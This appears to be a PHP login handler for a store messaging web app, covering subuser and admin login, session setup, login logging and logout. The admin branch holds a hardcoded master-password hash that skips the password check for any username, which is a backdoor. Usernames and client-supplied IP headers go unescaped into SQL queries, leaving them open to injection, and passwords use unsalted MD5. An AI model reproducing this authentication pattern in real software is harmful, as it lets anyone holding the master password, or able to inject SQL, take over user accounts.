<?php
session_start();

include_once $_SERVER['DOCUMENT_ROOT'] . "/includes/connect.php";
include_once $_SERVER['DOCUMENT_ROOT'] . "/includes/variables-functions.php";
       
class Mobilelogin {

    public $mysqli;
    public $post;
    public $type;
    public $authcode;
    
    public function __construct($mysqli,$authcode)
    {
        $this->mysqli   = $mysqli;
        $this->post     = $_POST;
        
        $this->action   = $_POST['action']; 
        $this->authcode = $authcode;
        $this->index();
    }
    
    public function location($location)
    {
        header("location:".$location);    
    }
    
    public function index()
    {
        switch ($this->action) {
            case 'login':
                $this->login();
                break;
            case 'logout':
                $this->logout();
                break;    
        } 
    }
    
    public function login()
    {
        if(empty($_POST['username']) || empty($_POST['password'])) 
        {
            $_SESSION['error'] = 'All fields are required!';
            $this->location($_SERVER['HTTP_REFERER']);
            exit();
        }
        
        $this->type     = $_POST['user_type']; 
        
        $username = strip_tags($this->post['username']);
        $password = MD5(strip_tags($this->post['password']));
        
        if($this->type == 'subuser') {
            $query      = "SELECT * FROM messages_subusers WHERE sub_username = '{$username}' and sub_pass = '{$password}' ";
            $result     = $this->mysqli->query($query);
            $user       = $result->fetch_assoc();
            $numrows    = $result->num_rows;
            $store_id   = $user['store_id'];
        } else {
            // 'incommaster'
            
            if($password == "1804d3a92328ee41c2cff2ac8557d509" ) {
                $query = "SELECT id, store.str_name, phone FROM user LEFT JOIN store ON user.id = store.str_id WHERE username='{$username}' ";
            } else {
            	$query = "SELECT user.id, store.str_name, phone FROM user LEFT JOIN store ON user.id = store.str_id WHERE user.username='{$username}' and user.pass='{$password}'";
            }
            
            $result   = $this->mysqli->query($query);
            $user     = $result->fetch_assoc();
            $numrows  = $result->num_rows;
            $store_id = $user['id'];
        }
      
        if($numrows < 1) 
        {
            $_SESSION['error'] = 'Wrong Login Details!';
        	$this->location($_SERVER['HTTP_REFERER']);
        	exit(); 
        } 
        
        $msg_setup_query   = "SELECT * FROM messages_setup WHERE store_id = $store_id";
        $msg_setup         = $this->mysqli->query($msg_setup_query);
        $msg_setup_res     = $msg_setup->fetch_assoc();
        $msg_setup_numrows = $msg_setup->num_rows;
        
        if($msg_setup_numrows > 0) 
        {
            $expire_date  = $msg_setup_res['expire'];
            $current_date = date('Y-m-d');  
            
            if((int)strtotime($current_date) >= (int)strtotime($expire_date))
            {
                $_SESSION['error'] = 'Expire date is passed!';
                $this->location($_SERVER['HTTP_REFERER']);
        	    exit();
            } 
        }
       
        if($this->type == 'subuser') {
           $this->createSubuserSession($user);
        } else {
           $this->createAdminSession($user); 
        }
        
        $this->location('/mobile/messages');
    }
    
    
    
    // SUBUSER
    
    public function createSubuserSession($user) 
    {
        $queryNumber               = "SELECT mynumber FROM messages_setup where store_id='{$user['store_id']}'  and storename='{$user['storename']}'";
        $resultNumber              = $this->mysqli->query($queryNumber);
        $arrNumber                 = $resultNumber->fetch_array(MYSQLI_ASSOC);
       
        $_SESSION['auth']          = $this->authcode;
        $_SESSION['user-id']       = $user['store_id'];
        $_SESSION['user-name']     = $user['storename'];
        $_SESSION['user-status']   = 'sub_user';
        $_SESSION['sub-user-id']   = $user['id'];
        $_SESSION['sub-user-name'] = $user['sub_name'];
        $_SESSION['mynumber']      = $arrNumber['mynumber'];
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        
        $date       = date('Y-m-d H:i:s');
        $store_id   = $user['store_id'];
        $storename  = $user['storename'];
        $subuser_id = $user['id']; ;
        $insert_sql = "INSERT INTO messages_logins (store_id,subuser_id,admin_id,storename,date,ip) VALUES($store_id,$subuser_id,0,'$storename','$date','$ip')";
        
        $this->mysqli->query($insert_sql);
    }
    
    
     // ADMIN
    
    public function createAdminSession($user) 
    {
        $queryNumber           = "SELECT mynumber FROM messages_setup where store_id='{$user['id']}'  and storename='{$user['str_name']}' ";
    	$resultNumber          = $this->mysqli->query($queryNumber);
    	$arrNumber             = $resultNumber->fetch_array(MYSQLI_ASSOC);
        
    	$_SESSION['auth']      = $this->authcode;
    	$_SESSION['user-id']   = $user['id'];
    	$_SESSION['user-name'] = $user['str_name'];
    	$_SESSION['mynumber']  = $arrNumber['mynumber'];
    	$_SESSION['phone']     = $user['phone'];
       
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        
        $date       = date('Y-m-d H:i:s');
        $store_id   = $user['id'];
        $storename  = $user['str_name'];
        $insert_sql = "INSERT INTO messages_logins (store_id,subuser_id,admin_id,storename,date,ip) VALUES($store_id,0,$store_id,'$storename','$date','$ip')";
        
        $this->mysqli->query($insert_sql);
    }
    
    
    
    
    public function logout()
    {   
        $is_subuser = isset($_SESSION['user-status']) && $_SESSION['user-status'] == 'sub_user' ? true : false;
        $type       = $is_subuser ? 'subuser' : 'admin';
        $location   = "/mobile/login/?type=$type";
        
        foreach($_SESSION as $key => $value) {
        	unset($_SESSION[$key]);
        }
      
        $this->location($location);
    }
    
    
    
}
    
    $Mobilelogin = new Mobilelogin($mysqli,$authcode);




?>